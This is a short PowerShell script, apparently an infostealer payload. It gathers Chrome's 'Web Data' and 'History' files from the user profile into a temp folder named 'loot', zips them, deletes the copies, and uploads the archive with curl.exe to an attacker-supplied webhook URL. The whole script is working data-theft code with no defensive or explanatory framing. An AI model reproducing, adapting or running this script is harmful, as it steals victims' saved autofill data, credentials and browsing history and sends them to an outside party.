
$dc = "$dc"
if ($hookurl.Ln -lt 120){$hookurl = (irm $hookurl).url}
$sourceDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
$tempFolder = [System.IO.Path]::GetTempPath() + "loot"
if (!(Test-Path $tempFolder)){
    New-Item -Path $tempFolder -ItemType Directory -Force
}

$filesToCopy = Get-ChildItem -Path $sourceDir -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' }
foreach ($file in $filesToCopy) {
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
    $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension + '.db'
    $destination = Join-Path -Path $tempFolder -ChildPath $newFileName
    Copy-Item -Path $file.FullName -Destination $destination -Force
}
$zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "loot.zip")
Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
$tempFolders = Get-ChildItem -Path $tempFolder -Directory
foreach ($folder in $tempFolders) {
    if ($folder.Name -ne "loot") {
        Remove-Item -Path $folder.FullName -Recurse -Force
    }
}
Remove-Item -Path $tempFolder -Recurse -Force

curl.exe -F file1=@"$zipFileName" $dc | Out-Null
